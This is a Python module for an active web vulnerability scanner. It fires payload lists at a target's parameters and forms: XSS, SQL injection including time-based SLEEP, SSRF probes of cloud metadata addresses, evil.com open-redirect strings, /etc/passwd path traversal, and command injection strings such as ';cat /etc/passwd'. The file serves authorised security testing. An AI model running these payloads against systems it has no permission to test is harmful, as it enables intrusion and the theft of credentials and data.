#!/usr/bin/env python3
"""
CSCAN — Active Web Vulnerability Tester (v3 — Crawler-Aware)
Tests for: XSS, SQLi (error + time-based), SSRF, Open Redirect,
           Path Traversal, Command Injection, IDOR hints.

v3: Now uses REAL forms and parameters discovered by the crawler,
    instead of guessing parameter names on the homepage.
    Falls back to parameter guessing only if no crawl data is provided.
"""

import os
import re
import time
import random
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from modules.stealth import StealthSession
from modules.ui import (
    section, ok, warn, alert, info, critical, bold, divider,
    progress_bar, G, R, Y, C, M, W, BR, DM, RS
)

WORDLISTS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'wordlists')

_stealth_session = None
_insecure_ssl    = False
_auth_header     = None
TIMEOUT          = 8


def set_stealth_session(s: StealthSession):
    global _stealth_session
    _stealth_session = s


def set_insecure_ssl(flag: bool):
    global _insecure_ssl
    _insecure_ssl = flag


def set_auth_header(header: str | None):
    global _auth_header
    _auth_header = header.strip() if header else None


# ── HTTP helpers ──────────────────────────────────────────────────────────────
def _get(url, params=None, timeout=TIMEOUT, allow_redirects=True, cookies=None):
    try:
        kw = {'params': params, 'timeout': timeout, 'allow_redirects': allow_redirects}
        if cookies:
            kw['cookies'] = cookies
        if _auth_header:
            kw['headers'] = {'Authorization': _auth_header}
        if _stealth_session:
            return _stealth_session.get(url, **kw)
        return requests.get(url, verify=not _insecure_ssl,
                            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                            **kw)
    except Exception:
        return None


def _post(url, data=None, timeout=TIMEOUT, cookies=None):
    try:
        kw = {'data': data, 'timeout': timeout}
        if cookies:
            kw['cookies'] = cookies
        if _auth_header:
            kw['headers'] = {'Authorization': _auth_header}
        if _stealth_session:
            return _stealth_session.post(url, **kw)
        return requests.post(url, verify=not _insecure_ssl,
                             headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                             **kw)
    except Exception:
        return None


def _build_url(target: str) -> str:
    if target.startswith(('http://', 'https://')):
        return target.rstrip('/')
    return f"http://{target.rstrip('/')}"


def _same_origin(url: str, base_url: str) -> bool:
    """Allow active requests only to the configured scheme, host, and port."""
    try:
        candidate = urllib.parse.urlparse(url)
        base = urllib.parse.urlparse(base_url)
        candidate_port = candidate.port or (443 if candidate.scheme == 'https' else 80)
        base_port = base.port or (443 if base.scheme == 'https' else 80)
        return (
            candidate.scheme in ('http', 'https')
            and candidate.scheme == base.scheme
            and candidate.hostname == base.hostname
            and candidate_port == base_port
        )
    except ValueError:
        return False


def _run_batch(jobs, workers: int = 8):
    """Run a sequence of zero-arg callables concurrently.

    Returns the first non-None result (fast-fail for confirmed findings);
    tolerant of per-job exceptions. jobs is an iterable of callables.
    """
    jobs = list(jobs)
    if not jobs:
        return None
    with ThreadPoolExecutor(max_workers=min(workers, max(1, len(jobs)))) as ex:
        futs = [ex.submit(j) for j in jobs]
        for fut in as_completed(futs):
            try:
                res = fut.result()
            except Exception:
                continue
            if res:
                return res
    return None


# ── Load payloads from wordlists (with fallback) ─────────────────────────────
def _load_payloads(filename: str, fallback: list) -> list:
    path = os.path.join(WORDLISTS_DIR, filename)
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            return lines if lines else fallback
    except Exception:
        return fallback


def _normalize_method(method) -> str:
    """Return 'GET' or 'POST' from any crawler/user-supplied method string."""
    if not method:
        return 'GET'
    m = str(method).strip().upper()
    return 'POST' if m == 'POST' else 'GET'


def _fresh_form_data(form: dict, base_values: dict = None, cookies: dict = None) -> dict:
    """Build POST data for a form, refreshing CSRF-style hidden tokens.

    Some apps rotate the CSRF token per page load; re-fetching the form's own
    action page and re-parsing hidden token fields keeps our requests valid so
    injections aren't silently dropped. Falls back to the supplied base values.
    """
    action = form.get('action', '')
    param_names = form.get('all_param_names', []) or []
    data = dict(base_values or {})
    # Pull hidden fields (token-type) fresh from the action page if possible.
    try:
        if action:
            r = _get(action, timeout=8, cookies=cookies)
            if r and r.text:
                hidden = re.findall(
                    r'<input\b[^>]*\btype\s*=\s*["\']hidden["\'][^>]*>', r.text, re.I)
                for h in hidden:
                    nm = re.search(r'\bname\s*=\s*["\']([^"\']*)["\']', h, re.I)
                    val = re.search(r'\bvalue\s*=\s*["\']([^"\']*)["\']', h, re.I)
                    if nm:
                        data[nm.group(1)] = val.group(1) if val else ''
            # ensure every declared param is present
            for p in param_names:
                data.setdefault(p, '')
    except Exception:
        pass
    return data


def _parse_forms_from_html(url: str, html: str) -> list:
    """Minimal regex-based HTML <form> parser -> list of form dicts.

    Useful when scanning a bare target URL directly (no crawl data) so that
    login/input forms are still exercised over POST instead of ignored.
    """
    forms = []
    pattern = re.compile(r'<form\b[^>]*>.*?</form>', re.I | re.S)
    for raw in pattern.findall(html or ''):
        tag = re.search(r'<form\b[^>]*>', raw, re.I)
        if not tag:
            continue
        attrs = tag.group(0)
        action_m = re.search(r'action\s*=\s*["\']([^"\']*)["\']', attrs, re.I)
        action = action_m.group(1) if action_m else url
        if not action.startswith(('http://', 'https://')):
            action = urllib.parse.urljoin(url, action)
        method_m = re.search(r'method\s*=\s*["\']([^"\']*)["\']', attrs, re.I)
        method = method_m.group(1) if method_m else 'GET'
        param_names = re.findall(
            r'<(?:input|select|textarea)\b[^>]*\bname\s*=\s*["\']([^"\']*)["\']',
            raw, re.I)
        param_names = [p for p in param_names if p]
        if param_names and action:
            forms.append({
                'action': action,
                'method': _normalize_method(method),
                'param_names': param_names,
                'all_param_names': param_names,
            })
    return forms


# ── XSS ──────────────────────────────────────────────────────────────────────
_XSS_FALLBACK = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '"><iframe src="javascript:alert(1)">',
    '<img src=x onerror=alert`1`>',
    '"><svg/onload=alert(1)//',
    "'-alert(1)-'",
    '<details open ontoggle=alert(1)>',
    '{{7*7}}',  # SSTI probe
    '${7*7}',   # Template injection
]

XSS_REFLECTION_PATTERNS = [
    re.compile(r'<script>alert\(1\)</script>', re.I),
    re.compile(r'onerror=alert\(1\)', re.I),
    re.compile(r'onload=alert\(1\)', re.I),
    re.compile(r'<svg\s+onload', re.I),
    re.compile(r'<iframe\s+src="javascript:', re.I),
    re.compile(r'ontoggle=alert\(1\)', re.I),
    re.compile(r'alert`1`', re.I),
    re.compile(r'\b49\b'),  # 7*7 = 49 (SSTI check)
]

# Fallback param names if no crawl data
FALLBACK_PARAMS = ['q', 'search', 'id', 'name', 'query', 'keyword', 'input',
                   'term', 'page', 'url', 'file', 'path', 'redirect', 'next',
                   'callback', 'return', 'view', 'action', 'type', 'cat',
                   'dir', 'ref', 'msg', 'email', 'user', 'username', 'login']


def _test_xss(target_url: str, params: list, cookies: dict = None) -> list:
    """Test XSS on discovered parameters (concurrent)."""
    payloads = _load_payloads('xss_payloads.txt', _XSS_FALLBACK)
    # Use top 50 payloads max for speed
    payloads = payloads[:50]
    findings = []

    def _try(param, payload):
        r = _get(target_url, params={param: payload}, cookies=cookies)
        if r and r.text:
            for pat in XSS_REFLECTION_PATTERNS:
                if pat.search(r.text):
                    return {
                        'type': 'Reflected XSS',
                        'severity': 'HIGH',
                        'param': param,
                        'payload': payload,
                        'url': r.url,
                        'evidence': pat.pattern[:60],
                    }
        return None

    for param in params:
        hit = _run_batch((lambda p=param, pl=pl: _try(p, pl)) for pl in payloads)
        if hit:
            findings.append(hit)
            break  # stop on first confirmed hit per endpoint
    return findings


def _test_xss_form(form: dict, cookies: dict = None) -> list:
    """Test XSS on a specific HTML form using POST (concurrent)."""
    payloads = _load_payloads('xss_payloads.txt', _XSS_FALLBACK)[:30]
    findings = []
    action = form.get('action', '')
    method = _normalize_method(form.get('method', 'GET'))
    param_names = form.get('all_param_names', [])

    if not param_names or not action:
        return []

    def _try(payload):
        base = {p: payload for p in param_names}  # inject into all fields
        data = _fresh_form_data(form, base, cookies)
        r = _post(action, data=data, cookies=cookies) if method == 'POST' \
            else _get(action, params=data, cookies=cookies)
        if r and r.text:
            for pat in XSS_REFLECTION_PATTERNS:
                if pat.search(r.text):
                    return {
                        'type': 'Reflected XSS (Form)',
                        'severity': 'HIGH',
                        'param': ', '.join(param_names[:3]),
                        'payload': payload,
                        'url': action,
                        'method': method,
                        'evidence': pat.pattern[:60],
                    }
        return None

    hit = _run_batch((lambda pl=pl: _try(pl)) for pl in payloads)
    if hit:
        findings.append(hit)
    return findings


# ── SQL Injection ─────────────────────────────────────────────────────────────
_SQLI_FALLBACK = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "1' AND SLEEP(0)--",
    "1; SELECT 1--",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "') OR ('1'='1",
    "1 AND 1=1",
    "1 AND 1=2",
]

SQLI_ERROR_PATTERNS = [
    re.compile(r"(sql syntax|mysql_fetch|ORA-\d{4,}|SQLSTATE|syntax error|unclosed quotation|"
               r"pg_query|unterminated string|quoted string not properly terminated|"
               r"Microsoft OLE DB|ODBC SQL Server|SQLite3::query|"
               r"Warning.*mysql_|PostgreSQL.*ERROR|"
               r"com\.mysql\.jdbc|org\.postgresql\.util)", re.I),
]

SQLI_TIME_PAYLOAD = "1' AND SLEEP(4)--"
SQLI_TIME_THRESHOLD = 3.5


def _test_sqli(target_url: str, params: list, cookies: dict = None) -> list:
    """Test SQL injection on discovered parameters."""
    payloads = _load_payloads('sqli_payloads.txt', _SQLI_FALLBACK)[:80]
    findings = []

    # Error-based (concurrent across payloads)
    for param in params:
        def _try(pl, _param=param):
            r = _get(target_url, params={_param: pl}, cookies=cookies)
            if r and r.text:
                for pat in SQLI_ERROR_PATTERNS:
                    if pat.search(r.text):
                        return {
                            'type': 'SQL Injection (Error-Based)',
                            'severity': 'CRITICAL',
                            'param': _param,
                            'payload': pl,
                            'url': r.url,
                            'evidence': pat.search(r.text).group(0)[:80],
                        }
            return None
        hit = _run_batch((lambda pl=pl: _try(pl)) for pl in payloads)
        if hit:
            findings.append(hit)
            return findings

    # Boolean-based blind (compare response sizes against baseline + both conditions)
    # A benign value establishes a baseline; SQLi is only suspected when BOTH
    # 1=1 and 1=2 differ from baseline AND from each other in a consistent way.
    for param in params[:5]:
        try:
            r_base = _get(target_url, params={param: "1"}, cookies=cookies)
            r_true = _get(target_url, params={param: "1 AND 1=1"}, cookies=cookies)
            r_false = _get(target_url, params={param: "1 AND 1=2"}, cookies=cookies)
        except Exception:
            continue
        if not (r_base and r_true and r_false):
            continue
        for rr in (r_base, r_true, r_false):
            if rr.status_code != 200 or not rr.text:
                break
        else:
            cat = str(target_url).split('?')[0]
            len_base = len(r_base.text)
            len_true = len(r_true.text)
            len_false = len(r_false.text)
            # Both injected variants must clearly diverge from the baseline.
            d_true = len_true - len_base
            d_false = len_false - len_base
            if abs(d_true) > 50 and abs(d_false) > 50 and abs(d_true - d_false) > 30:
                findings.append({
                    'type': 'SQL Injection (Boolean Blind - Possible)',
                    'severity': 'HIGH',
                    'param': param,
                    'payload': '1 AND 1=1 vs 1 AND 1=2',
                    'url': cat,
                    'evidence': (f'Response sizes — base={len_base}B, 1=1→{len_true}B '
                                 f'(Δ{d_true:+d}), 1=2→{len_false}B (Δ{d_false:+d})'),
                })

    # Time-based blind (check primary params only — expensive)
    for param in params[:3]:
        try:
            start = time.time()
            r = _get(target_url, params={param: SQLI_TIME_PAYLOAD}, timeout=10, cookies=cookies)
            elapsed = time.time() - start
            if elapsed >= SQLI_TIME_THRESHOLD:
                # Confirm: run without SLEEP to rule out slow server
                start2 = time.time()
                _get(target_url, params={param: "1"}, timeout=10, cookies=cookies)
                baseline = time.time() - start2
                if elapsed > baseline + 3.0:
                    findings.append({
                        'type': 'SQL Injection (Time-Based Blind)',
                        'severity': 'CRITICAL',
                        'param': param,
                        'payload': SQLI_TIME_PAYLOAD,
                        'url': target_url,
                        'evidence': f'Delayed {elapsed:.1f}s vs baseline {baseline:.1f}s',
                    })
        except Exception:
            pass

    return findings


def _test_sqli_form(form: dict, cookies: dict = None) -> list:
    """Test SQLi on a specific HTML form (concurrent across payloads)."""
    payloads = _load_payloads('sqli_payloads.txt', _SQLI_FALLBACK)[:30]
    findings = []
    action = form.get('action', '')
    method = _normalize_method(form.get('method', 'GET'))
    param_names = form.get('all_param_names', [])

    if not param_names or not action:
        return []

    def _try(args):
        payload, target_param = args
        base = {p: 'test' for p in param_names}
        base[target_param] = payload
        data = _fresh_form_data(form, base, cookies)
        r = _post(action, data=data, cookies=cookies) if method == 'POST' \
            else _get(action, params=data, cookies=cookies)
        if r and r.text:
            for pat in SQLI_ERROR_PATTERNS:
                if pat.search(r.text):
                    return {
                        'type': 'SQL Injection (Error-Based via Form)',
                        'severity': 'CRITICAL',
                        'param': target_param,
                        'payload': payload,
                        'url': action,
                        'method': method,
                        'evidence': pat.search(r.text).group(0)[:80],
                    }
        return None

    jobs = [(pl, tp) for pl in payloads for tp in param_names]
    hit = _run_batch((lambda a=a: _try(a)) for a in jobs)
    if hit:
        findings.append(hit)
    return findings


def scan_sqli_target(target: str, form: dict | None = None, cookies: dict | None = None) -> dict:
    """Direct SQLi scanner for a URL or form payload.

    Accepts either:
      - a raw URL such as https://example.com/search?q=test
      - a form dict with action, method, and parameter names
      - any injectable target passed in as a dict/string
    """
    if not target:
        return {'target': None, 'findings': [], 'status': 'no_target'}

    if isinstance(target, dict):
        form = target
        target = form.get('action') or form.get('url') or 'https://example.com'

    if form:
        findings = _test_sqli_form(form, cookies=cookies)
        return {'target': target, 'findings': findings, 'status': 'ok' if findings else 'no_findings'}

    parsed = urllib.parse.urlparse(target)
    if not parsed.scheme:
        target = _build_url(target)

    params = []
    if parsed.query:
        params = list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())

    if not params:
        params = FALLBACK_PARAMS[:15]

    findings = _test_sqli(target, params, cookies=cookies)
    return {'target': target, 'findings': findings, 'status': 'ok' if findings else 'no_findings'}


def discover_forms(target: str, cookies: dict = None) -> list:
    """Fetch a URL and return the HTML forms found on it (already normalized).

    Each form is resolved to an absolute action URL so it can be POSTed to
    directly. Returns [] if no forms exist or the page can't be fetched.
    """
    base = _build_url(target)
    probe = _get(base, timeout=TIMEOUT, cookies=cookies)
    if not probe or not getattr(probe, 'text', None):
        return []
    forms = _parse_forms_from_html(base, probe.text)
    return [f for f in forms if _same_origin(f.get('action', ''), base)]


def inject_test_forms(forms: list, include: bool = True, cookies: dict = None) -> dict:
    """Run injection tests (SQLi + XSS) against discovered form endpoints.

    forms: list of normalized form dicts (from discover_forms). include is kept
    for signature compatibility; always tests both SQLi and XSS.
    Returns {'targets': n, 'findings': [...], 'total': n}.
    """
    findings = []
    for f in forms[:15]:
        try:
            findings.extend(_test_sqli_form(f, cookies=cookies))
            findings.extend(_test_xss_form(f, cookies=cookies))
        except Exception:
            continue
    return {'targets': len(forms), 'findings': findings, 'total': len(findings)}


def scan_and_inject(target: str, cookies: dict = None) -> dict:
    """One-shot: fetch a URL, detect its form(s), and injection-test them.

    Convenience wrapper for "enter URL → find the form endpoint → test
    SQLi/XSS injection" in a single call.
    """
    base = _build_url(target)
    forms = discover_forms(base, cookies=cookies)
    if not forms:
        return {'target': base, 'forms': 0, 'findings': [], 'total': 0,
                'status': 'no_forms'}
    res = inject_test_forms(forms, cookies=cookies)
    res['target'] = base
    res['forms'] = len(forms)
    res['status'] = 'ok' if res['total'] else 'no_findings'
    return res


# ── Open Redirect ─────────────────────────────────────────────────────────────
REDIRECT_PAYLOADS = [
    'https://evil.com', '//evil.com', '/\\evil.com',
    'https%3A%2F%2Fevil.com', 'https://evil.com/.example.com',
    '////evil.com', 'https:evil.com', '〱evil.com',
    'https://evil.com@example.com',
]
REDIRECT_PARAMS = ['next', 'redirect', 'url', 'return', 'goto', 'dest',
                   'destination', 'return_to', 'redir', 'continue',
                   'forward', 'target', 'to', 'out', 'view', 'ref']


def _test_open_redirect(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    # Combine discovered params with known redirect param names
    test_params = list(set(params + REDIRECT_PARAMS))

    def _try(args):
        param, payload = args
        r = _get(base_url, params={param: payload}, allow_redirects=False, cookies=cookies)
        if r and r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get('Location', '')
            if 'evil.com' in loc:
                return {
                    'type': 'Open Redirect',
                    'severity': 'MEDIUM',
                    'param': param,
                    'payload': payload,
                    'location': loc,
                    'url': r.url,
                }
        return None

    jobs = [(param, pl) for param in test_params for pl in REDIRECT_PAYLOADS[:4]]
    hit = _run_batch((lambda a=a: _try(a)) for a in jobs)
    if hit:
        findings.append(hit)
    return findings


# ── SSRF ──────────────────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/',
    'http://169.254.169.254/metadata/v1/',
    'http://127.0.0.1/',
    'http://localhost/',
    'http://0.0.0.0/',
    'http://[::1]/',
    'http://0177.0.0.1/',        # octal
    'http://2130706433/',          # decimal
    'http://127.1/',
]
SSRF_PARAMS = ['url', 'src', 'fetch', 'load', 'path', 'img', 'file', 'data',
               'proxy', 'uri', 'href', 'link', 'source', 'image', 'domain']
SSRF_EVIDENCE = re.compile(r'(ami-id|instance-id|account-id|computeMetadata|metadata\.google|127\.0\.0\.1|localhost|root:x:0)', re.I)


def _test_ssrf(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    test_params = list(set(params + SSRF_PARAMS))

    def _try(args):
        param, payload = args
        r = _get(base_url, params={param: payload}, timeout=6, cookies=cookies)
        if r and r.text and SSRF_EVIDENCE.search(r.text):
            return {
                'type': 'Server-Side Request Forgery (SSRF)',
                'severity': 'CRITICAL',
                'param': param,
                'payload': payload,
                'url': r.url,
                'evidence': SSRF_EVIDENCE.search(r.text).group(0),
            }
        return None

    jobs = [(param, pl) for param in test_params for pl in SSRF_PAYLOADS[:5]]
    hit = _run_batch((lambda a=a: _try(a)) for a in jobs)
    if hit:
        findings.append(hit)
    return findings


# ── Path Traversal ────────────────────────────────────────────────────────────
PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
    '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '/etc/passwd', '..%252f..%252f..%252fetc/passwd',
    '....\\....\\....\\etc\\passwd', '..%c0%af..%c0%afetc/passwd',
    '..%00/..%00/..%00/etc/passwd',
]
PATH_PARAMS = ['file', 'path', 'doc', 'page', 'template', 'include', 'view',
               'content', 'folder', 'dir', 'document', 'root', 'load']
PATH_EVIDENCE = re.compile(r'(root:x:0:0:|daemon:|bin:|nobody:|\\[extensions\\]|; for 16-bit)', re.I)


def _test_path_traversal(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    test_params = list(set(params + PATH_PARAMS))

    def _try(args):
        param, payload = args
        r = _get(base_url, params={param: payload}, cookies=cookies)
        if r and r.text and PATH_EVIDENCE.search(r.text):
            return {
                'type': 'Path Traversal (LFI)',
                'severity': 'CRITICAL',
                'param': param,
                'payload': payload,
                'url': r.url,
                'evidence': PATH_EVIDENCE.search(r.text).group(0),
            }
        return None

    jobs = [(param, pl) for param in test_params for pl in PATH_TRAVERSAL_PAYLOADS]
    hit = _run_batch((lambda a=a: _try(a)) for a in jobs)
    if hit:
        findings.append(hit)
    return findings


# ── Command Injection ─────────────────────────────────────────────────────────
CMD_PAYLOADS = [
    ';id', '|id', '`id`', '$(id)', '; whoami', '| whoami',
    '& whoami', '|| whoami', ';cat /etc/passwd',
    '| cat /etc/passwd', '`cat /etc/passwd`',
]
CMD_PARAMS = ['cmd', 'exec', 'command', 'run', 'ping', 'host', 'ip',
              'process', 'execute', 'system', 'do']
CMD_EVIDENCE = re.compile(r'(uid=\d+\(|root\:|daemon\:|www-data\:|nobody\:|root:x:0)', re.I)


def _test_cmdi(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    test_params = list(set(params + CMD_PARAMS))

    def _try(args):
        param, payload = args
        r = _get(base_url, params={param: payload}, cookies=cookies)
        if r and r.text and CMD_EVIDENCE.search(r.text):
            return {
                'type': 'Command Injection (RCE)',
                'severity': 'CRITICAL',
                'param': param,
                'payload': payload,
                'url': r.url,
                'evidence': CMD_EVIDENCE.search(r.text).group(0),
            }
        return None

    jobs = [(param, pl) for param in test_params for pl in CMD_PAYLOADS]
    hit = _run_batch((lambda a=a: _try(a)) for a in jobs)
    if hit:
        findings.append(hit)
    return findings


# ── SSTI (Server-Side Template Injection) ─────────────────────────────────────
SSTI_PAYLOADS = [
    ('{{7*7}}', '49'),
    ('${7*7}', '49'),
    ('<%= 7*7 %>', '49'),
    ('{{7*\'7\'}}', '7777777'),
    ('${T(java.lang.Runtime).getRuntime()}', 'java.lang.Runtime'),
]


def _test_ssti(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []

    def _try(args):
        param, payload, expected = args
        r = _get(base_url, params={param: payload}, cookies=cookies)
        if r and r.text and expected in r.text and payload not in r.text:
            return {
                'type': 'Server-Side Template Injection (SSTI)',
                'severity': 'CRITICAL',
                'param': param,
                'payload': payload,
                'url': r.url,
                'evidence': f'Expected "{expected}" found in response',
            }
        return None

    for param in params[:10]:
        jobs = [(param, payload, expected) for payload, expected in SSTI_PAYLOADS]
        hit = _run_batch((lambda a=a: _try(a)) for a in jobs)
        if hit:
            findings.append(hit)
            return findings
    return findings


# ── IDOR Hint Detection ───────────────────────────────────────────────────────
def _test_idor_hint(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    # Look for numeric ID parameters specifically
    id_params = [p for p in params if any(x in p.lower() for x in
                 ('id', 'uid', 'user_id', 'account', 'order', 'invoice', 'num', 'pid'))]

    def _try(param):
        r1 = _get(base_url, params={param: '1'}, cookies=cookies)
        r2 = _get(base_url, params={param: '2'}, cookies=cookies)
        if r1 and r2 and r1.status_code == 200 and r2.status_code == 200:
            if r1.text != r2.text and len(r1.text) > 100 and len(r2.text) > 100:
                # Additional check: both should have different meaningful content
                size_diff = abs(len(r1.text) - len(r2.text))
                # Only flag if content meaningfully differs
                if size_diff < len(r1.text) * 0.9:
                    return {
                        'type': 'Potential IDOR',
                        'severity': 'MEDIUM',
                        'param': param,
                        'url': base_url,
                        'evidence': f'?{param}=1 ({len(r1.text)}B) vs ?{param}=2 ({len(r2.text)}B) — different content, same endpoint',
                    }
        return None

    hit = _run_batch((lambda p=p: _try(p)) for p in id_params[:5])
    if hit:
        findings.append(hit)
    return findings


# ── Main Entry Point ──────────────────────────────────────────────────────────
def active_vuln_scan(target: str, use_ssl: bool = False,
                     crawl_data: dict = None, cookies: dict = None) -> dict:
    """
    Active vulnerability scanner.
    If crawl_data is provided (from modules.crawler), tests are run against
    REAL discovered endpoints and parameters. Otherwise falls back to guessing.
    """
    section("ACTIVE WEB VULNERABILITY SCANNER")
    base = _build_url(target)
    if use_ssl and base.startswith('http://'):
        base = 'https://' + base[7:]

    info(f"Target        : {BR}{W}{base}{RS}")
    warn("Active mode — payloads will be sent to the target.")
    warn("Only use on systems you own or have written permission to test.\n")

    # Determine test targets from crawl data or fallback
    test_targets = []
    forms = []
    if crawl_data and crawl_data.get('parameters'):
        discovered_params = list(crawl_data['parameters'].keys())
        ok(f"Using {len(discovered_params)} parameters from crawler")

        # Build test targets from crawled pages that have parameters
        tested_urls = set()
        for param, urls in crawl_data['parameters'].items():
            for url in (urls if isinstance(urls, list) else [urls]):
                if not _same_origin(url, base):
                    continue
                if url not in tested_urls:
                    tested_urls.add(url)
                    # Collect all params for this URL
                    url_params = [p for p, u_list in crawl_data['parameters'].items()
                                  if url in (u_list if isinstance(u_list, list) else [u_list])]
                    test_targets.append({'url': url, 'params': url_params})

        # Also add form-based targets
        forms = crawl_data.get('forms', []) or []
        if forms:
            ok(f"Using {len(forms)} forms from crawler")

        # Also test JS-discovered endpoints
        js_endpoints = crawl_data.get('js_endpoints', [])
        if js_endpoints:
            info(f"Also testing {len(js_endpoints)} JS-discovered endpoints")
            for ep in js_endpoints[:20]:
                if not _same_origin(ep, base):
                    continue
                test_targets.append({'url': ep, 'params': FALLBACK_PARAMS[:10]})
    else:
        warn("No crawl data — falling back to parameter guessing (less effective)")
        warn("Run the Web Crawler first for better results!\n")
        # Fetch the target page and extract forms ourselves so login/input
        # forms are exercised with their real POST parameters.
        probe = _get(base, timeout=TIMEOUT, cookies=cookies)
        if probe and getattr(probe, 'text', None):
            forms = _parse_forms_from_html(base, probe.text)
            if forms:
                ok(f"Detected {len(forms)} HTML form(s) directly from the target")
        # Only guess GET params when the URL actually has query parameters —
        # firing thousands of unrelated GET payloads at a login/static page
        # is both slow and useless.
        url_qp = list(urllib.parse.parse_qs(
            urllib.parse.urlparse(base).query, keep_blank_values=True).keys())
        if url_qp:
            test_targets = [{'url': base, 'params': url_qp}]
        elif forms:
            info("Target URL has no query parameters — focusing on detected form(s).")
            test_targets = []
        else:
            info("No forms or URL parameters found — using a small guess set.")
            test_targets = [{'url': base, 'params': FALLBACK_PARAMS[:6]}]

    # Cap targets to avoid excessive scanning
    if not test_targets and not forms:
        test_targets = [{'url': base, 'params': FALLBACK_PARAMS[:6]}]
    test_targets = test_targets[:30]
    info(f"Testing       : {len(test_targets)} endpoint(s)")
    if forms:
        info(f"Form testing   : {len(forms)} form(s) over {'/'.join(sorted({f.get('method', 'GET') for f in forms}))}")

    test_suite = [
        ('XSS (Reflected)',        _test_xss),
        ('SQL Injection',          _test_sqli),
        ('Open Redirect',          _test_open_redirect),
        ('SSRF',                   _test_ssrf),
        ('Path Traversal / LFI',   _test_path_traversal),
        ('Command Injection',       _test_cmdi),
        ('SSTI',                    _test_ssti),
        ('IDOR Hint',              _test_idor_hint),
    ]

    all_findings = []
    total_tests = len(test_suite) * len(test_targets)
    done = 0

    for target_info in test_targets:
        url = target_info['url']
        params = target_info['params']

        for name, fn in test_suite:
            done += 1
            progress_bar(done, total_tests, f'{name} on {url[-30:]}')
            try:
                hits = fn(url, params, cookies=cookies)
                all_findings.extend(hits)
            except Exception:
                pass

    # Test forms (POST-based)
    if forms:
        for i, form in enumerate(forms[:15]):
            if not _same_origin(form.get('action', ''), base):
                continue
            progress_bar(i + 1, min(len(forms), 15), 'form testing')
            try:
                all_findings.extend(_test_xss_form(form, cookies=cookies))
                all_findings.extend(_test_sqli_form(form, cookies=cookies))
            except Exception:
                pass

    print('\n')
    divider()

    if not all_findings:
        ok("No active vulnerabilities detected in this scan round.")
        if not crawl_data and not forms:
            info("Tip: Run the Web Crawler first — it discovers real parameters to test.")
        else:
            info("Note: Custom or encoded parameters may still be vulnerable.")
    else:
        # Deduplicate findings
        seen = set()
        unique_findings = []
        for f in all_findings:
            key = (f['type'], f.get('param', ''), f.get('url', ''))
            if key not in seen:
                seen.add(key)
                unique_findings.append(f)
        all_findings = unique_findings

        for f in all_findings:
            sev = f.get('severity', 'INFO')
            col = R if sev == 'CRITICAL' else (Y if sev in ('HIGH', 'MEDIUM') else C)
            print(f"  {BR}{col}[{sev}]{RS}  {BR}{W}{f['type']}{RS}")
            print(f"         {DM}Param   :{RS} {f.get('param', 'N/A')}")
            print(f"         {DM}Payload :{RS} {f.get('payload', 'N/A')[:60]}")
            if f.get('evidence'):
                print(f"         {DM}Evidence:{RS} {f['evidence'][:80]}")
            print(f"         {DM}URL     :{RS} {f.get('url', base)[:80]}")
            if f.get('method'):
                print(f"         {DM}Method  :{RS} {f['method']}")
            print()

        crits = [f for f in all_findings if f.get('severity') == 'CRITICAL']
        highs = [f for f in all_findings if f.get('severity') == 'HIGH']
        if crits:
            critical(f"{len(crits)} CRITICAL vulnerability(ies) confirmed! Immediate remediation required.")
        if highs:
            alert(f"{len(highs)} HIGH severity finding(s) — review promptly.")

    return {'findings': all_findings, 'total': len(all_findings)}
